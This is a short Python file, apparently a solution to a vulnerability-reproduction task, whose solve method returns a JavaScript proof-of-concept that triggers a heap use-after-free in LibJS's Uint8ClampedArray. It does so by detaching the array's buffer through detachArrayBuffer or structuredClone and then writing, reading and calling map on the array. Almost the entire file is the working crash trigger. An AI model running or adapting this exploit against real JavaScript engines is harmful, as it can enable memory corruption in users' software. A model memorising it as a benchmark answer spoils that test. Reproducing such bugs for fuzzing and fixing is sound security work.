class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use-After-Free in Uint8ClampedArray in LibJS.
        # Uint8ClampedArray was implemented as a separate class and failed to properly
        # handle ArrayBuffer detachment, unlike other TypedArrays.
        # By creating a Uint8ClampedArray, detaching its buffer, and then accessing it,
        # we can trigger the UAF.

        poc = r"""
try {
    // 1. Setup the vulnerable object
    var u8 = new Uint8ClampedArray(256);
    var buf = u8.buffer;

    // 2. Detach the underlying buffer
    // In LibJS test environment (js shell), detachArrayBuffer is global.
    var detached = false;
    try {
        if (typeof detachArrayBuffer === 'function') {
            detachArrayBuffer(buf);
            detached = true;
        }
    } catch (e) {}

    if (!detached && typeof structuredClone === 'function') {
        try {
            structuredClone(buf, { transfer: [buf] });
            detached = true;
        } catch (e) {}
    }

    // 3. Trigger UAF
    // If the implementation doesn't check for detachment, this accesses freed memory.
    
    // Write access
    u8[0] = 0x41;
    
    // Read access
    var x = u8[0];

    // 4. Trigger UAF via iteration methods (map/filter)
    // This targets loops that might cache the data pointer
    var u8_loop = new Uint8ClampedArray(100);
    u8_loop.fill(1);
    u8_loop.map(function(val, idx) {
        if (idx === 0) {
            try {
                if (typeof detachArrayBuffer === 'function') {
                    detachArrayBuffer(u8_loop.buffer);
                }
            } catch(e) {}
        }
        return val;
    });

} catch (e) {
    // Catch JS errors, we want the process to crash due to ASAN/Segmentation Fault
}
"""
        return poc.encode('utf-8')
